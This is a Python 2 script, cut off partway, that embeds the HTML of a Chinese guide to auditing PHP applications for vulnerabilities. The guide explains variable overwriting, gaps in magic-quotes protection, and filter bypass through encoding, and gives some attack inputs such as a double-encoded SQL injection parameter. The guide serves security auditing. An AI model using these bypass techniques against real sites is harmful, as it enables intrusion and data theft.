#!/usr/bin/env python
# -*- coding:utf-8-*-

import sys
reload(sys)
sys.setdefaultencoding('utf-8')
import os
import argparse

php_htm_default='''
<!DOCTYPE html>
<META content="text/html; charset=unicode" http-equiv=Content-Type>
<p></p><ol><li>summary Php Application Source Code Audits Advanced Technology - Simplified Chinese</li></ol>
<table id="user-content-toc" summary="Contents"><tbody><tr><td><div id="user-content-toctitle"><h2><a id="user-content-table-of-contents" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#table-of-contents" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Table of Contents</h2></div><ul><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#PHP">高级PHP应用程序漏洞审核技术</a><ul><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#">前言</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-2">传统的代码审计技术</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#PHP-2">PHP版本与应用代码审计</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-3">其他的因素与应用代码审计</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-4">扩展我们的字典</a><ul><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#key">变量本身的key</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-5">变量覆盖</a><ul><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-6">遍历初始化变量</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#parse_str">parse_str()变量覆盖漏洞</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#import_request_variables">import_request_variables()变量覆盖漏洞</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#PHP5_Globals">PHP5 Globals</a></li></ul></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#magic_quotes_gpc">magic_quotes_gpc与代码安全</a><ul><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#magic_quotes_gpc-2">什么是magic_quotes_gpc</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-7">哪些地方没有魔术引号的保护</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-8">变量的编码与解码</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-9">二次攻击</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-10">魔术引号带来的新的安全问题</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#key-2">变量key与魔术引号</a></li></ul></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-11">代码注射</a><ul><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#PHP-3">PHP中可能导致代码注射的函数</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-12">变量函数与双引号</a></li></ul></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#PHP-4">PHP自身函数漏洞及缺陷</a><ul><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#PHP-5">PHP函数的溢出漏洞</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#PHP-6">PHP函数的其他漏洞</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#session_destroy">session_destroy()删除文件漏洞</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-13">随机函数</a></li></ul></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-14">特殊字符</a><ul><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-15">截断</a><ul><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#include">include截断</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-16">数据截断</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-17">文件操作里的特殊字符</a></li></ul></li></ul></li></ul></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-18">怎么进一步寻找新的字典</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#DEMO">DEMO</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-19">后话</a></li><li><a href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#-20">附录</a></li></ul></li></ul></td></tr></tbody></table>
<p></p><h1><a id="user-content-高级php应用程序漏洞审核技术" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#高级php应用程序漏洞审核技术" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content-PHP"></a>高级PHP应用程序漏洞审核技术</h1>
<p>&lt;wiki:toc max_depth="5"&gt;&lt;/wiki:toc&gt;
</p>
<h2><a id="user-content-前言" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#前言" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name=""></a>前言</h2>
<p>PHP是一种被广泛使用的脚本语言，尤其适合于web开发。具有跨平台，容易学习，功能强大等特点，据统计全世界有超过34%的网站有php的应用，包括Yahoo、sina、163、sohu等大型门户网站。而且很多具名的web应用系统（包括bbs,blog,wiki,cms等等）都是使用php开发的，Discuz、phpwind、phpbb、vbb、wordpress、boblog等等。随着web安全的热点升级，php应用程序的代码安全问题也逐步兴盛起来，越来越多的安全人员投入到这个领域，越来越多的应用程序代码漏洞被披露。针对这样一个状况，很多应用程序的官方都成立了安全部门，或者雇佣安全人员进行代码审计，因此出现了很多自动化商业化的代码审计工具。也就是这样的形势导致了一个局面：大公司的产品安全系数大大的提高，那些很明显的漏洞基本灭绝了，那些大家都知道的审计技术都无用武之地了。我们面对很多工具以及大牛扫描过n遍的代码，有很多的安全人员有点悲观，而有的官方安全人员也非常的放心自己的代码，但是不要忘记了“没有绝对的安全”，我们应该去寻找新的途径挖掘新的漏洞。本文就给介绍了一些非传统的技术经验和大家分享。
</p>
<p>另外在这里特别说明一下本文里面很多漏洞都是来源于网络上牛人和朋友们的分享，在这里需要感谢他们 ：）
</p>
<h2><a id="user-content-传统的代码审计技术" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#传统的代码审计技术" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content--2"></a>传统的代码审计技术</h2>
<p>WEB应用程序漏洞查找基本上是围绕两个元素展开：变量与函数。也就是说一漏洞的利用必须把你提交的恶意代码通过变量经过n次变量转换传递，最终传递给目标函数执行，还记得MS那句经典的名言吗？“一切输入都是有害的”。这句话只强调了变量输入，很多程序员把“输入”理解为只是gpc`[`$`_`GET,$`_`POST,$`_`COOKIE`]`，但是变量在传递过程产生了n多的变化。导致很多过滤只是个“纸老虎”！我们换句话来描叙下代码安全：“一切进入函数的变量是有害的”。
</p>
<p>PHP代码审计技术用的最多也是目前的主力方法：静态分析，主要也是通过查找容易导致安全漏洞的危险函数，常用的如grep，findstr等搜索工具，很多自动化工具也是使用正则来搜索这些函数。下面列举一些常用的函数，也就是下文说的字典（暂略）。但是目前基本已有的字典很难找到漏洞，所以我们需要扩展我们的字典，这些字典也是本文主要探讨的。
</p>
<p>其他的方法有：通过修改PHP源代码来分析变量流程，或者hook危险的函数来实现对应用程序代码的审核，但是这些也依靠了我们上面提到的字典。
</p>

<h2><a id="user-content-php版本与应用代码审计" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#php版本与应用代码审计" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content-PHP-2"></a>PHP版本与应用代码审计</h2>



<p>到目前为止，PHP主要有3个版本：php4、php5、php6，使用比例大致如下：
</p>
<p>|| php4 || 68% || 2000-2007，No security fixes after 2008/08，最终版本是php4.4.9 ||
|| php5 || 32% || 2004-present，Now at version 5.2.6（PHP 5.3 alpha1 released!） ||
|| php6 || || 目前还在测试阶段，变化很多做了大量的修改，取消了很多安全选项如magic_quotes_gpc（这个不是今天讨论的范围） ||
</p>
<p>由于php缺少自动升级的机制，导致目前PHP版本并存，也导致很多存在漏洞没有被修补。这些有漏洞的函数也是我们进行WEB应用程序代码审计的重点对象，也是我们字典重要来源。
</p>

<h2><a id="user-content-其他的因素与应用代码审计" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#其他的因素与应用代码审计" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content--3"></a>其他的因素与应用代码审计</h2>



<p>很多代码审计者拿到代码就看，他们忽视了“安全是一个整体”，代码安全很多的其他因素有关系，比如上面我们谈到的PHP版本的问题，比较重要的还有操作系统类型（主要是两大阵营win/`*`nix），WEB服务端软件（主要是iis/apache两大类型）等因素。这是由于不同的系统不同的WEB SERVER有着不同的安全特点或特性，下文有些部分会涉及。
</p>
<p>所以我们在做某个公司WEB应用代码审计时，应该了解他们使用的系统，WEB服务端软件，PHP版本等信息。
</p>

<h2><a id="user-content-扩展我们的字典" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#扩展我们的字典" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content--4"></a>扩展我们的字典</h2>



<p>下面将详细介绍一些非传统PHP应用代码审计一些漏洞类型和利用技巧。
</p>

<h3><a id="user-content-变量本身的key" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#变量本身的key" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content-key"></a>变量本身的key</h3>



<p>说到变量的提交很多人只是看到了GET/POST/COOKIE等提交的变量的值，但是忘记了有的程序把变量本身的key也当变量提取给函数处理。
</p>


<p>上面的代码就提取了变量本身的key显示出来，单纯对于上面的代码，如果我们提交URL：
</p>


<p>那么就导致一个xss的漏洞，扩展一下如果这个key提交给include()等函数或者sql查询呢？：） 
</p>
<p>|| *漏洞审计策略* ||
|| PHP版本要求：无<br>系统要求：无<br>审计策略：通读代码 ||
</p>

<h3><a id="user-content-变量覆盖" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#变量覆盖" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content--5"></a>变量覆盖</h3>



<p>很多的漏洞查找者都知道extract()这个函数在指定参数为EXTR_OVERWRITE或者没有指定函数可以导致变量覆盖，但是还有很多其他情况导致变量覆盖的如：
</p>

<h4><a id="user-content-遍历初始化变量" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#遍历初始化变量" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content--6"></a>遍历初始化变量</h4>



<p>请看如下代码：
</p>


<p>很多的WEB应用都使用上面的方式（注意循环不一定是foreach），如Discuz!4.1的WAP部分的代码：
</p>


<p>|| *漏洞审计策略* ||
|| PHP版本要求：无<br>系统要求：无<br>审计策略：通读代码 ||
</p>

<h4><a id="user-content-parse_str变量覆盖漏洞" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#parse_str变量覆盖漏洞" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content-parse_str"></a>parse_str()变量覆盖漏洞</h4>





<p></p><pre></pre>
<p></p>
<p>该函数一样可以覆盖数组变量，上面的代码是通过$`_`SERVER['QUERY_STRING']来提取变量的，对于指定了变量名的我们可以通过注射“=”来实现覆盖其他的变量：
</p>


<p>上面的代码通过提交$var来实现对$var1的覆盖。
</p>
<p>|| *漏洞审计策略（parse_str）* ||
|| PHP版本要求：无<br>系统要求：无<br>审计策略：查找字符parse_str ||
</p>
<p>|| *漏洞审计策略（mb_parse_str）* ||
|| PHP版本要求：php4&lt;4.4.7 php5&lt;5.2.2<br>系统要求：无<br>审计策略：查找字符mb_parse_str ||
</p>


<h4><a id="user-content-import_request_variables变量覆盖漏洞" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#import_request_variables变量覆盖漏洞" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content-import_request_variables"></a>import_request_variables()变量覆盖漏洞</h4>





<p>|| *漏洞审计策略（import_request_variables）* ||
|| PHP版本要求：php4&lt;4.4.1 php5&lt;5.2.2<br>系统要求：无<br>审计策略：查找字符import_request_variables ||
</p>

<h4><a id="user-content-php5-globals" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#php5-globals" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content-PHP5_Globals"></a>PHP5 Globals</h4>



<p>从严格意义上来说这个不可以算是PHP的漏洞，只能算是一个特性，测试代码：
</p>


<p>但是很多的程序没有考虑到这点，请看如下代码：
</p>


<p>如果熟悉WEB2.0的攻击的同学，很容易想到上面的代码我们可以利用这个特性进行crsf攻击。
</p>
<p>|| *漏洞审计策略* ||
|| PHP版本要求：无<br>系统要求：无<br>审计策略：通读代码 ||
</p>

<h3><a id="user-content-magic_quotes_gpc与代码安全" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#magic_quotes_gpc与代码安全" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content-magic_quotes_gpc"></a>magic_quotes_gpc与代码安全</h3>



<p></p><pre></pre>
<p></p>

<h4><a id="user-content-什么是magic_quotes_gpc" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#什么是magic_quotes_gpc" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content-magic_quotes_gpc-2"></a>什么是magic_quotes_gpc</h4>



<p></p><pre></pre>
<p></p>
<p>当打开时，所有的 '（单引号），"（双引号），\（反斜线）和 NULL 字符都会被自动加上一个反斜线进行转义。还有很多函数有类似的作用 如：addslashes()、mysql_escape_string()、mysql_real_escape_string()等，另外还有parse_str()后的变量也受magic_quotes_gpc的影响。目前大多数的主机都打开了这个选项，并且很多程序员也注意使用上面那些函数去过滤变量，这看上去很安全。很多漏洞查找者或者工具遇到些函数过滤后的变量直接就放弃，但是就在他们放弃的同时也放过很多致命的安全漏洞。 ：）
</p>

<h4><a id="user-content-哪些地方没有魔术引号的保护" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#哪些地方没有魔术引号的保护" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content--7"></a>哪些地方没有魔术引号的保护</h4>



<p></p><pre></pre>
<p></p>


<p></p><ul><li>1) $`_`SERVER变量*</li></ul>
PHP5的$`_`SERVER变量缺少magic_quotes_gpc的保护，导致近年来X-Forwarded-For的漏洞猛暴，所以很多程序员考虑过滤X-Forwarded-For，但是其他的变量呢？
<p></p>
<p>|| *漏洞审计策略（$`_`SERVER变量）* ||
|| PHP版本要求：无<br>系统要求：无<br>审计策略：查找字符`_`SERVER ||
</p>


<p></p><ul><li>2) getenv()得到的变量（使用类似$`_`SERVER变量）*</li></ul>
|| *漏洞审计策略（getenv()）* ||
|| PHP版本要求：无<br>系统要求：无<br>审计策略：查找字符getenv ||
<p></p>


<p></p><ul><li>3) $HTTP_RAW_POST_DATA与PHP输入、输出流*</li></ul>
主要应用与soap/xmlrpc/webpublish功能里，请看如下代码：
<p></p>

            
<p>|| *漏洞审计策略（数据流）* ||
|| PHP版本要求：无<br>系统要求：无<br>审计策略：查找字符HTTP_RAW_POST_DATA或者php://input ||
</p>


<p></p><ul><li>4) 数据库操作容易忘记'的地方如：in()/limit/order by/group by*</li></ul>
如Discuz!&lt;5.0的pm.php：
<p></p>
<p></p><pre></pre>
<p></p>


<p>|| *漏洞审计策略* ||
|| PHP版本要求：无<br>系统要求：无<br>审计策略：查找数据库操作字符（select,update,insert等等） ||
</p>


<h4><a id="user-content-变量的编码与解码" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#变量的编码与解码" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content--8"></a>变量的编码与解码</h4>



<p>一个WEB程序很多功能的实现都需要变量的编码解码，而且就在这一转一解的传递过程中就悄悄的绕过你的过滤的安全防线。
</p>
<p>这个类型的主要函数有：
</p>




<p></p><ul><li>1) stripslashes() 这个其实就是一个decode-addslashes()*</li><li>2) 其他字符串转换函数：*</li></ul>
|| base64_decode || 对使用 MIME base64 编码的数据进行解码 ||
|| base64_encode || 使用 MIME base64 对数据进行编码 ||
|| rawurldecode || 对已编码的 URL 字符串进行解码 ||
|| rawurlencode || 按照 RFC 1738 对 URL 进行编码 ||
|| urldecode || 解码已编码的 URL 字符串 ||
|| urlencode || 编码 URL 字符串 ||
|| ... || ... ||
<p></p>
<p>_另外一个 unserialize/serialize_
</p>


<p></p><ul><li>3) 字符集函数（GKB,UTF7/8...）如iconv()/mb_convert_encoding()等*</li></ul>
目前很多漏洞挖掘者开始注意这一类型的漏洞了，如典型的urldecode：
<p></p>


<p>当magic_quotes_gpc=on时，我们提交?id=%2527，得到sql语句为：
</p>


<p>|| *漏洞审计策略* ||
|| PHP版本要求：无<br>系统要求：无<br>审计策略：查找对应的编码函数 ||
</p>

